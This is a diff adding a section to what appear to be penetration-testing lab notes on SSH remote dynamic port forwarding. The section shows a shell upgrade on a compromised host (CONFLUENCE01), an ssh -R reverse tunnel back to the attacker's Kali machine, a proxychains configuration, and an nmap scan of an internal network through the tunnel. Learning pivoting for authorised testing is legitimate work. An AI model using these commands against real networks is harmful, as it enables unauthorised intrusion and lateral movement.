@@ -109,6 +109,41 @@ In order to connect back to the Kali SSH server using a username and password yo
 
 
 
+## SSH Remote Dynamic Port Forwarding
+
+{% hint style="info" %}
+Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6.2 Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.
+{% endhint %}
+
+The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same -R option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.
+
+To bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine, we simply specify -R 9998 to the SSH command we run on CONFLUENCE01. We'll also pass the -N flag to prevent a shell from being opened.
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+ssh -N -R 9998 kali@192.168.118.4
+```
+
+```
+kali@kali:~$ tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+
+```
+
+```
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+```
+
 ## Reverse tunnel to attack host
 
 UserKnownHostsFile=/dev/null and StrictHostKeyChecking=no. The first option prevents ssh from attempting to save the host key by sending the output to /dev/null. The second option will instruct ssh to not prompt us to accept the host key. Both of these options can be set via the -o flag.
